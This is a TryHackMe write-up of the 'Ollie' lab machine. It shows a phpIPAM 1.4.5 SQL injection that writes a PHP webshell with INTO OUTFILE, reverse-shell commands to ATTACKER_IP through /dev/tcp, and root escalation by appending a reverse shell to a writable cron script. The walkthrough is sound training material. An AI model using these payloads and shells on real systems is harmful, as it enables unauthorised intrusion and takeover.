# Ollie — TryHackMe Writeup

**Difficulty:** Medium | **OS:** Linux | **Platform:** [TryHackMe](https://tryhackme.com/room/ollie)

---

## Introduction

Ollie is a medium-difficulty Linux machine on TryHackMe created by 0day. It features a custom interactive service on a non-standard port that hands out credentials, an authenticated SQL injection in phpIPAM 1.4.5 that escalates to Remote Code Execution via MySQL's `INTO OUTFILE`, and a privilege escalation through a root-owned cron script writable by the target user. A great machine for practicing the importance of full port scanning and chaining multiple vulnerabilities together.

---

## Reconnaissance

### Full Port Scan

The most important lesson this machine teaches is right at the start: **always scan all ports**.

```bash
nmap -p- --min-rate 5000 -Pn <TARGET_IP>
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
```

A standard `nmap -sC -sV` only reveals ports 22 and 80 — missing port **1337** entirely. That hidden port is the key to the whole machine.

### Web Enumeration

Port 80 runs **phpIPAM v1.4.5** — an open-source IP address management application. A few things stand out immediately when inspecting the page source:

- `robots.txt` disallows `/immaolllieeboyyy` — a rabbit hole, nothing useful there
- The login form contains a hidden field `phpipamredirect` with the value `admin' OR 1=1 -- -` — a clear hint that SQL injection is in scope
- The footer reveals the software version and a contact email
- The `base href` points to `ollieshouse.thm` — add it to `/etc/hosts`

```bash
echo "<TARGET_IP> ollieshouse.thm" | sudo tee -a /etc/hosts
```

---

## Foothold — Getting Credentials

### The Custom Service on Port 1337

Port 1337 (leet speak for "elite") is a common CTF indicator of a custom, non-standard service. Connecting with netcat reveals an interactive chatbot named Ollie:

```bash
nc <TARGET_IP> 1337
```

```
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? ollie
What's up, Ollie! It's been a while. What are you here for? exploit
Ya' know what? Ollie. If you can answer a question about me, I might have
something for you.

What breed of dog am I? Bulldog, Husky, Duck or Wolf? <answer>

You are correct! Let me confer with my trusted colleagues...

Username: admin
Password: <redacted>
```

The bot hands us admin credentials for the phpIPAM panel. Simple, but only reachable if you actually scan all 65535 ports.

---

## Exploitation — SQLi to RCE (phpIPAM 1.4.5)

### Finding the Vulnerability

Searching ExploitDB confirms phpIPAM 1.4.5 is vulnerable:

```bash
searchsploit phpipam
```

```
phpIPAM 1.4.5 - Remote Code Execution (RCE) | php/webapps/50963.py
```

The vulnerability is an **authenticated SQL injection** in the BGP route mapping search endpoint:

```
/app/admin/routing/edit-bgp-mapping-search.php
```

The `subnet` POST parameter is passed directly into a SQL query without sanitization. More importantly, the MySQL user `phpipam_ollie` has the `FILE` privilege — meaning we can use `UNION SELECT ... INTO OUTFILE` to write arbitrary files to disk, including a PHP webshell directly into the web root.

### How the Exploit Works

The exploit (50963.py) automates three steps:

1. **Authentication** — POSTs credentials to `/app/login/login_check.php` and captures the session cookie
2. **SQLi payload** — POSTs a UNION SELECT that writes a HEX-encoded PHP webshell to `/var/www/html/evil.php` via `INTO OUTFILE`
3. **Verification** — GETs `/evil.php` to confirm code execution

The raw SQL payload looks like this:

```sql
" Union Select 1,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,3,4 
INTO OUTFILE '/var/www/html/evil.php' -- -
```

The HEX string decodes to `<?php system($_GET["cmd"]); ?>`.

### Executing the Exploit

```bash
mkdir -p ~/oscp/machines/ollie/exploit
cp /usr/share/exploitdb/exploits/php/webapps/50963.py ~/oscp/machines/ollie/exploit/

python3 ~/oscp/machines/ollie/exploit/50963.py \
  -url http://ollieshouse.thm \
  -usr admin \
  -pwd '<redacted>' \
  -cmd id
```

```
[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
[+] Success! The shell is located at http://ollieshouse.thm/evil.php. Parameter: cmd
[+] Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have code execution as `www-data`.

### Getting a Reverse Shell

The webshell works, but a proper reverse shell is far more convenient. The `--shell` flag in the exploit has quoting issues in bash, so triggering it directly through curl with a URL-encoded payload is more reliable:

**Listener:**
```bash
nc -nlvp 4444
```

**Trigger:**
```bash
curl "http://ollieshouse.thm/evil.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

```
connect to [ATTACKER_IP] from (UNKNOWN) [<TARGET_IP>]
www-data@ip-<TARGET_IP>:/var/www/html$
```

Stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag — Password Reuse

The first thing to try after getting a foothold is always password reuse. We have the password obtained from the chatbot — does Ollie reuse it for his system account?

```bash
su ollie
# Password: <redacted>
```

It works. We're now `ollie`.

```bash
cat /home/ollie/user.txt
# THM{...}
```

---

## Privilege Escalation — Writable Root Cron Script

### Process Monitoring with pspy64

`linpeas` doesn't highlight anything obvious, so we turn to `pspy64` — a tool that monitors running processes without requiring root privileges. It catches scheduled tasks that don't appear in `crontab -l`.

```bash
# Transfer pspy64 to target
wget http://ATTACKER_IP:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

After a few seconds, a suspicious entry appears:

```
CMD: UID=0  PID=4261  | /bin/bash /usr/bin/feedme
```

A script called `feedme` runs repeatedly as **root (UID=0)**. Let's check its permissions:

```bash
ls -la /usr/bin/feedme
cat /usr/bin/feedme
```

```
-rwxrw-r-- 1 root ollie 180 Apr 9 12:20 /usr/bin/feedme

#!/bin/bash
# This is weird?
```

The permissions `-rwxrw-r--` tell the full story:
- Owner (root): read, write, execute
- **Group (ollie): read and write** ← we are `ollie`
- Others: read only

We can write to a script that root executes. This is an immediate path to root.

### Exploiting feedme

Set up a listener on a new port:

```bash
nc -nlvp 5555
```

Append a reverse shell to the script:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1' >> /usr/bin/feedme
```

Wait a few seconds for the cron job to trigger:

```
connect to [ATTACKER_IP] from (UNKNOWN) [<TARGET_IP>]
root@hackerdog:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
# THM{...}
```

---

## Summary

| Step | Vector | Result |
|------|--------|--------|
| Full port scan | nmap -p- | Discovers port 1337 |
| nc 1337 | Custom chatbot interaction | admin credentials |
| phpIPAM SQLi | CVE / ExploitDB 50963 | PHP webshell on disk |
| curl evil.php | bash TCP redirect | www-data shell |
| su ollie | Password reuse | User flag |
| pspy64 + feedme | Writable root cron script | Root shell |

## Key Takeaways

**Always run a full port scan.** A default `nmap` scan would have missed port 1337 entirely, sending you down dead ends for hours. Make `nmap -p- --min-rate 5000` your standard first step.

**Read the exploit source before touching the target.** The ExploitDB script for phpIPAM 1.4.5 tells you exactly which endpoint is vulnerable. Trying to fuzz random parameters manually wastes time.

**Password reuse is everywhere.** The single credential obtained from the chatbot unlocked both the web panel and the system account. Always test found passwords against every available service and user.

**pspy64 catches what crontab hides.** System administrators sometimes schedule tasks outside of standard crontab. pspy64 is essential for complete process enumeration during privilege escalation.

---

*Machine by 0day on TryHackMe. Writeup by pandaman.*
